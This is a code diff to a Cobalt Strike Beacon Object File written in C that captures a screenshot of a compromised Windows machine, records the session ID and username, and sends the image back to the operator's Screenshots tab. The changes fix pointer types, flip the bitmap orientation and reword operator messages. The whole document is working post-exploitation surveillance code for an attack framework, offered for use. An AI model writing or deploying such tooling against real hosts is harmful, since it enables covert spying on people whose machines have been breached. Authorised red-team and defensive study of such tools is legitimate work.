@@ -6,7 +6,7 @@
 #pragma comment(lib, "Gdi32.lib")
 
 /*Download Screenshot*/
-void downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
+void downloadScreenshot(unsigned char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
 // Function modified by @BinaryFaultline
 
 // This data helped me figure out the C code to download a screenshot. It was found in the BOF.NET code here: https://github.com/CCob/BOF.NET/blob/2da573a4a2a760b00e66cd051043aebb2cfd3182/managed/BOFNET/BeaconObject.cs
@@ -118,7 +118,7 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap)
     GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
     bi.biSize = sizeof(BITMAPINFOHEADER);
     bi.biWidth = Bitmap0.bmWidth;
-    bi.biHeight = -Bitmap0.bmHeight;
+    bi.biHeight = Bitmap0.bmHeight;
     bi.biPlanes = 1;
     bi.biBitCount = wBitCount;
     bi.biCompression = BI_RGB;
@@ -163,9 +163,9 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap)
     bmfHdr.bfReserved1 = 0;
     bmfHdr.bfReserved2 = 0;
     bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
-    void* bmpdata = malloc(sizeof(BITMAPFILEHEADER) + dwDIBSize);
+    unsigned char* bmpdata = (unsigned char*)malloc(sizeof(BITMAPFILEHEADER) + dwDIBSize);
     memcpy(bmpdata, &bmfHdr, sizeof(BITMAPFILEHEADER));
-    memcpy(((char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);
+    memcpy(((unsigned char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);
 
     // The CALLBACK_SCREENSHOT takes sessionId, title (window title in default CS screenshot fork&run), username, so we need to populate those
     // Since the original author didn't do any window enumeration, I am not going through the effort of doing that enumeration, instead it's hardcoded
@@ -173,12 +173,12 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap)
     KERNEL32$ProcessIdToSessionId(KERNEL32$GetCurrentProcessId(), &session);
     char* user;
     user = (char*)getenv("USERNAME");
-    char title[] = "Right-click this and Save to view";
+    char title[] = "Right-click and \"Render BMP\" to view";
     
     int userLength = MSVCRT$_snprintf(NULL,0,"%s",user);
     int titleLength = MSVCRT$_snprintf(NULL,0,"%s",title);
 
-    downloadScreenshot((char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize), session,(char*)title, titleLength, (char*)user, userLength);
+    downloadScreenshot(bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, session,(char*)title, titleLength, (char*)user, userLength);
     //WriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER)+ dwDIBSize, &dwWritten, NULL);
 
     /* clean up */
@@ -218,7 +218,6 @@ void go(char* buff, int len) {
     */
     
     BeaconPrintf(0x0, "[+] Saving bitmap screenshot to Screenshots tab...");
-    BeaconPrintf(0x0, "[*] Currently Cobalt Strike's Screenshots tab only supports rendering JPG files, so you need to right-click and \"Save\"...");
     SaveHBITMAPToFile(hBitmap);
 
     // clean up
